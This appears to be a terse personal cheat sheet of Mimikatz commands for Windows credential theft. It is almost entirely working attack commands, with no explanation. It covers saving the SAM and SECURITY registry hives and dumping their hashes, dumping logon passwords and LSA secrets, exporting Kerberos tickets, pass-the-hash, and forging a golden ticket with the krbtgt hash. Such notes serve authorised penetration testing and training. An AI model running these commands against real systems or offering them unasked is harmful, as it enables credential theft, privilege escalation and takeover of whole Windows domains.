# MIMIKATZ
#escalate
```sh
privilege::debug
token::elevate
```

#sam
```
1. from cmd/powershell dumb sam and secureity files
reg save hklm\sam sam.hiv
reg save hklm\security security.hiv

2. start mimikatz then escelate
privilege::debug
token::elevate

3. log output
log hash.txt

4. dump hashes
lsadump::sam sam.hiv security.hiv
```

#other_passwords
```sh
sekurlsa::logonpasswords      # privilege::debug required
lsadump::cache
lsadump::sam                  # token::elevate + privilege::debug required
lsadump::lsa /patch           # privilege::debug required
![[Pasted image 20230512010509.png]]```

#tickets
```sh
sekurlsa::tickets /export
kerberos::list /export
```

#pass_the_hash
```sh
sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[hash] /run:[command]
```

#golden_ticket
```sh
lsadump::lsa /inject /name:krbtgt
kerberos::golden /domain:[domain] /sid:[sid of user forging the ticket] /rc4:[hash] /user:[any user] /id:500 /ptt
```
[[GOLDEN TICKET]]


#misc
```sh
misc::cmd
```